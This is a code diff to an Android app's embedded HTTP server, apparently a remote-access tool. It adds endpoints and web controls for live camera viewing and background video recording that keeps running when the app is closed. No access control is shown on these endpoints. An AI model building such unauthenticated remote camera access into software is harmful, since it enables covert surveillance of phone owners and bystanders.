@@ -144,6 +144,22 @@ public class RavanHttpServer extends NanoHTTPD {
                 return serveCameraCapture(params);
             } else if (uri.equals("/camera/photo")) {
                 return serveCameraPhoto(params);
+            } else if (uri.equals("/camera/live")) {
+                return serveLiveStreamPage(params);
+            } else if (uri.equals("/camera/stream")) {
+                return serveMJPEGStream(params);
+            } else if (uri.equals("/camera/frame")) {
+                return serveSingleFrame();
+            } else if (uri.equals("/camera/start-stream")) {
+                return startCameraStream(params);
+            } else if (uri.equals("/camera/stop-stream")) {
+                return stopCameraStream();
+            } else if (uri.equals("/camera/record")) {
+                return startVideoRecording(params);
+            } else if (uri.equals("/camera/stop-record")) {
+                return stopVideoRecording();
+            } else if (uri.equals("/camera/status")) {
+                return serveCameraStatus();
             } else if (uri.startsWith("/download/")) {
                 return serveDownload(uri);
             } else {
@@ -849,6 +865,84 @@ public class RavanHttpServer extends NanoHTTPD {
             }
             html.append("</div>");
             html.append("</div>");
+
+            // Live Streaming Section
+            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
+            html.append("<h3 style=\"color: #e74c3c; margin-bottom: 15px;\">&#128249; Live Streaming</h3>");
+            html.append(
+                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">View live camera feed in your browser</p>");
+            html.append(
+                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");
+
+            for (CameraHelper.CameraInfo cam : cameras) {
+                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128249;";
+                html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" ");
+                html.append("style=\"padding: 25px 20px; background: rgba(231, 76, 60, 0.2); ");
+                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
+                html.append("border: 1px solid rgba(231, 76, 60, 0.3); display: block;\">");
+                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
+                html.append("<div style=\"color: #e74c3c; font-weight: 600;\">Live ").append(cam.facing)
+                        .append("</div>");
+                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">Click for stream</div>");
+                html.append("</a>");
+            }
+            html.append("</div>");
+            html.append("</div>");
+
+            // Video Recording Section
+            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
+            html.append("<h3 style=\"color: #27ae60; margin-bottom: 15px;\">&#127909; Background Video Recording</h3>");
+            html.append(
+                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Record video in background - works even when app is closed</p>");
+            html.append(
+                    "<div id=\"rec-status\" style=\"text-align: center; margin-bottom: 15px; color: #888;\">Checking status...</div>");
+            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
+
+            for (CameraHelper.CameraInfo cam : cameras) {
+                html.append("<button onclick=\"startRecording('").append(cam.id).append("')\" ");
+                html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #27ae60, #2ecc71); ");
+                html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
+                html.append("&#127909; Record ").append(cam.facing);
+                html.append("</button>");
+            }
+
+            html.append("<button onclick=\"stopRecording()\" ");
+            html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #e74c3c, #c0392b); ");
+            html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
+            html.append("&#9632; Stop Recording");
+            html.append("</button>");
+            html.append("</div>");
+
+            // JavaScript for recording
+            html.append("<script>");
+            html.append("function startRecording(camId) {");
+            html.append("  fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
+            html.append(
+                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording from camera ' + camId + '...</span>';");
+            html.append("  });");
+            html.append("}");
+            html.append("function stopRecording() {");
+            html.append("  fetch('/camera/stop-record').then(r => r.json()).then(d => {");
+            html.append(
+                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #27ae60;\">Recording stopped. ' + (d.path || '') + '</span>';");
+            html.append("  });");
+            html.append("}");
+            html.append("function checkRecStatus() {");
+            html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
+            html.append("    if (d.recording) {");
+            html.append(
+                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording in progress (' + d.duration + 's)</span>';");
+            html.append("    } else {");
+            html.append(
+                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #888;\">Not recording</span>';");
+            html.append("    }");
+            html.append("  });");
+            html.append("}");
+            html.append("checkRecStatus();");
+            html.append("setInterval(checkRecStatus, 2000);");
+            html.append("</script>");
+
+            html.append("</div>");
         }
 
         html.append("</div>");
@@ -958,5 +1052,301 @@ public class RavanHttpServer extends NanoHTTPD {
         } catch (Exception e) {
             return serveError("Error capturing photo: " + e.getMessage());
         }
+    }
+
+    // ============ LIVE STREAMING ============
+
+    private Response serveLiveStreamPage(Map<String, String> params) {
+        String camId = params.get("cam");
+        if (camId == null)
+            camId = "0";
+
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128249; Live Camera Stream</h2>");
+
+        // Check permission
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
+                html.append("<p>Camera permission not granted.</p>");
+                html.append("</div>");
+                html.append("</div>");
+                html.append(HTML_FOOTER);
+                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+            }
+        }
+
+        // Live stream viewer
+        html.append("<div style=\"text-align: center; margin-bottom: 20px;\">");
+        html.append(
+                "<div id=\"stream-container\" style=\"position: relative; display: inline-block; background: #000; border-radius: 10px; overflow: hidden; min-height: 240px;\">");
+        html.append(
+                "<img id=\"stream\" src=\"/camera/frame\" style=\"max-width: 100%; height: auto; display: block;\" onerror=\"this.src='/camera/frame?t='+Date.now()\" />");
+        html.append(
+                "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem;\">");
+        html.append("<span id=\"stream-status\" style=\"color: #2ecc71;\">&#9679; LIVE</span>");
+        html.append("</div>");
+        html.append(
+                "<div id=\"rec-indicator\" style=\"position: absolute; top: 10px; right: 10px; background: rgba(231, 76, 60, 0.9); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; display: none;\">");
+        html.append("<span style=\"color: #fff;\">&#9679; REC</span>");
+        html.append("</div>");
+        html.append("</div>");
+        html.append("</div>");
+
+        // Controls
+        html.append(
+                "<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 20px;\">");
+
+        // Camera selection
+        CameraHelper cameraHelper = new CameraHelper(context);
+        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
+        for (CameraHelper.CameraInfo cam : cameras) {
+            String selected = cam.id.equals(camId) ? "background: #e94560; color: #fff;" : "";
+            html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" ");
+            html.append(
+                    "style=\"padding: 10px 20px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; ")
+                    .append(selected).append("\">");
+            html.append(cam.facing).append(" Camera");
+            html.append("</a>");
+        }
+        html.append("</div>");
+
+        // Action buttons
+        html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
+        html.append(
+                "<button onclick=\"capturePhoto()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#128247; Capture Photo</button>");
+        html.append(
+                "<button id=\"rec-btn\" onclick=\"toggleRecording()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #e74c3c, #c0392b); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#9679; Start Recording</button>");
+        html.append(
+                "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none;\">&#8592; Back</a>");
+        html.append("</div>");
+
+        // Status
+        html.append(
+                "<div id=\"status\" style=\"text-align: center; margin-top: 20px; color: #888; font-size: 0.9rem;\"></div>");
+
+        // JavaScript for live stream
+        html.append("<script>");
+        html.append("var camId = '").append(camId).append("';");
+        html.append("var isRecording = false;");
+        html.append("var streamImg = document.getElementById('stream');");
+        html.append("var refreshRate = 100;"); // 10 FPS
+
+        // Start streaming
+        html.append("function startStream() {");
+        html.append("  fetch('/camera/start-stream?cam=' + camId + '&width=640&height=480&quality=60');");
+        html.append("  setTimeout(refreshFrame, 500);");
+        html.append("}");
+
+        // Refresh frame
+        html.append("function refreshFrame() {");
+        html.append("  streamImg.src = '/camera/frame?t=' + Date.now();");
+        html.append("  setTimeout(refreshFrame, refreshRate);");
+        html.append("}");
+
+        // Capture photo
+        html.append("function capturePhoto() {");
+        html.append("  window.open('/camera/photo?cam=' + camId, '_blank');");
+        html.append("}");
+
+        // Toggle recording
+        html.append("function toggleRecording() {");
+        html.append("  var btn = document.getElementById('rec-btn');");
+        html.append("  var indicator = document.getElementById('rec-indicator');");
+        html.append("  if (isRecording) {");
+        html.append("    fetch('/camera/stop-record').then(r => r.json()).then(d => {");
+        html.append("      document.getElementById('status').innerHTML = d.message;");
+        html.append("      btn.innerHTML = '&#9679; Start Recording';");
+        html.append("      btn.style.background = 'linear-gradient(135deg, #e74c3c, #c0392b)';");
+        html.append("      indicator.style.display = 'none';");
+        html.append("      isRecording = false;");
+        html.append("    });");
+        html.append("  } else {");
+        html.append("    fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
+        html.append("      document.getElementById('status').innerHTML = d.message;");
+        html.append("      btn.innerHTML = '&#9632; Stop Recording';");
+        html.append("      btn.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';");
+        html.append("      indicator.style.display = 'block';");
+        html.append("      isRecording = true;");
+        html.append("    });");
+        html.append("  }");
+        html.append("}");
+
+        // Check status
+        html.append("function checkStatus() {");
+        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
+        html.append("    if (d.recording) {");
+        html.append("      document.getElementById('rec-indicator').style.display = 'block';");
+        html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; Stop Recording';");
+        html.append("      isRecording = true;");
+        html.append("    }");
+        html.append("  });");
+        html.append("}");
+
+        html.append("startStream();");
+        html.append("checkStatus();");
+        html.append("</script>");
+
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveMJPEGStream(Map<String, String> params) {
+        // Start stream if not already
+        if (!CameraService.isCurrentlyStreaming()) {
+            String camId = params.get("cam");
+            startCameraStreamInternal(camId != null ? camId : "0", 640, 480, 50);
+            try {
+                Thread.sleep(500);
+            } catch (InterruptedException e) {
+            }
+        }
+
+        // Return single frame for simplicity (MJPEG multipart is complex with
+        // NanoHTTPD)
+        return serveSingleFrame();
+    }
+
+    private Response serveSingleFrame() {
+        byte[] frame = CameraService.getNextFrame(200);
+        if (frame != null && frame.length > 0) {
+            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
+            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
+            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+            response.addHeader("Pragma", "no-cache");
+            response.addHeader("Expires", "0");
+            return response;
+        } else {
+            // Return a 1x1 transparent pixel as fallback
+            byte[] pixel = new byte[] {
+                    (byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0x00, 0x10, 0x4A, 0x46,
+                    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
+                    (byte) 0xFF, (byte) 0xDB, 0x00, 0x43, 0x00, 0x08, 0x06, 0x06, 0x07, 0x06,
+                    0x05, 0x08, 0x07, 0x07, 0x07, 0x09, 0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D,
+                    0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12, 0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F,
+                    0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20, 0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C,
+                    0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29, 0x2C, 0x30, 0x31, 0x34, 0x34, 0x34,
+                    0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32, 0x3C, 0x2E, 0x33, 0x34, 0x32,
+                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01,
+                    0x01, 0x11, 0x00, (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01,
+                    0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
+                    0x0A, 0x0B, (byte) 0xFF, (byte) 0xC4, 0x00, (byte) 0xB5, 0x10, 0x00, 0x02,
+                    0x01, 0x03, 0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00,
+                    0x01, 0x7D, (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
+                    0x3F, 0x00, 0x7F, (byte) 0xFF, (byte) 0xD9
+            };
+            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(pixel);
+            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, pixel.length);
+            response.addHeader("Cache-Control", "no-cache");
+            return response;
+        }
+    }
+
+    private Response startCameraStream(Map<String, String> params) {
+        String camId = params.get("cam");
+        String widthStr = params.get("width");
+        String heightStr = params.get("height");
+        String qualityStr = params.get("quality");
+
+        int width = 640, height = 480, quality = 50;
+        try {
+            if (widthStr != null)
+                width = Integer.parseInt(widthStr);
+            if (heightStr != null)
+                height = Integer.parseInt(heightStr);
+            if (qualityStr != null)
+                quality = Integer.parseInt(qualityStr);
+        } catch (Exception e) {
+        }
+
+        startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);
+
+        String json = "{\"success\": true, \"message\": \"Stream started\", \"camera\": \"" +
+                (camId != null ? camId : "0") + "\"}";
+        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
+    }
+
+    private void startCameraStreamInternal(String camId, int width, int height, int quality) {
+        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
+        intent.setAction("START_STREAM");
+        intent.putExtra("cameraId", camId);
+        intent.putExtra("width", width);
+        intent.putExtra("height", height);
+        intent.putExtra("quality", quality);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(intent);
+        } else {
+            context.startService(intent);
+        }
+    }
+
+    private Response stopCameraStream() {
+        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
+        intent.setAction("STOP_STREAM");
+        context.startService(intent);
+
+        String json = "{\"success\": true, \"message\": \"Stream stopped\"}";
+        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
+    }
+
+    private Response startVideoRecording(Map<String, String> params) {
+        String camId = params.get("cam");
+        String widthStr = params.get("width");
+        String heightStr = params.get("height");
+
+        int width = 1280, height = 720;
+        try {
+            if (widthStr != null)
+                width = Integer.parseInt(widthStr);
+            if (heightStr != null)
+                height = Integer.parseInt(heightStr);
+        } catch (Exception e) {
+        }
+
+        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
+        intent.setAction("START_RECORDING");
+        intent.putExtra("cameraId", camId != null ? camId : "0");
+        intent.putExtra("width", width);
+        intent.putExtra("height", height);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(intent);
+        } else {
+            context.startService(intent);
+        }
+
+        String json = "{\"success\": true, \"message\": \"Recording started\", \"camera\": \"" +
+                (camId != null ? camId : "0") + "\"}";
+        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
+    }
+
+    private Response stopVideoRecording() {
+        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
+        intent.setAction("STOP_RECORDING");
+        context.startService(intent);
+
+        String videoPath = CameraService.getCurrentVideoPath();
+        String json = "{\"success\": true, \"message\": \"Recording stopped\"" +
+                (videoPath != null ? ", \"path\": \"" + videoPath + "\"" : "") + "}";
+        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
+    }
+
+    private Response serveCameraStatus() {
+        boolean streaming = CameraService.isCurrentlyStreaming();
+        boolean recording = CameraService.isCurrentlyRecording();
+        String currentCamera = CameraService.getCurrentCameraId();
+        long duration = CameraService.getRecordingDuration();
+        String videoPath = CameraService.getCurrentVideoPath();
+
+        String json = String.format(
+                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s}",
+                streaming, recording, currentCamera, duration,
+                videoPath != null ? "\"" + videoPath + "\"" : "null");
+        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
     }
 }
